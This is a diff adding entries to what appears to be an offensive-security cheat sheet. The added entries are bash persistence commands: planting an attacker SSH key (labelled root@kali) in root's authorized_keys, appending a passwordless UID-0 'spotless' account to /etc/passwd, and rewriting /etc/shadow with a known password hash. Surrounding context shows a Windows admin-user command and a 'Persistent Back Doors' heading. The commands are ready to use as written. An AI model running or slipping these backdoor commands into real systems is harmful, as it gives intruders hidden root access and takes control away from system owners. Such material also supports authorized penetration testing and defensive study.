@@ -506,6 +506,19 @@ wine vncpwdump.exe -k key
 net user spotless spotless /add & net localgroup Administrators spotless /add 
 ```
 
+#### Creating SSH Authorized Keys
+```bash
+mkdir /root/.ssh 2>/dev/null; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQChKCUsFVWj1Nz8SiM01Zw/BOWcMNs2Zwz3MdT7leLU9/Un4mZ7vjco0ctsyh2swjphWr5WZG28BN90+tkyj3su23UzrlgEu3SaOjVgxhkx/Pnbvuua9Qs9gWbWyRxexaC1eDb0pKXHH2Msx+GlyjfDOngq8tR6tkU8u1S4lXKLejaptiz0q6P0CcR6hD42IYkqyuWTNrFdSGLtiPCBDZMZ/5g1cJsyR59n54IpV0b2muE3F7+NPQmLx57IxoPjYPNUbC6RPh/Saf7o/552iOcmVCdLQDR/9I+jdZIgrOpstqSiJooU9+JImlUtAkFxZ9SHvtRbFt47iH7Sh7LiefP5 root@kali' >> /root/.ssh/authorized_keys
+```
+
+#### Creating Backdoor User w/o Password
+```bash
+echo 'spotless::0:0:root:/root:/bin/bash' >> /etc/passwd
+
+# Rarely needed, but if you need to add a password to the previously created user by using useradd and passwd is not working. Pwd is "kali"
+sed 's/!/\$6$o1\.HFMVM$a3hY6OPT\/DiQYy4koI6Z3\/sLiltsOcFoS5yCKhBBqQLH5K1QlHKL8\/6wJI6uF\/Q7mniOdq92v6yjzlVlXlxkT\./' /etc/shadow > /etc/s2; cat /etc/s2 > /etc/shadow; rm /etc/s2
+```
+
 #### Persistent Back Doors
 ```
 # Launch evil.exe every 10 minutes
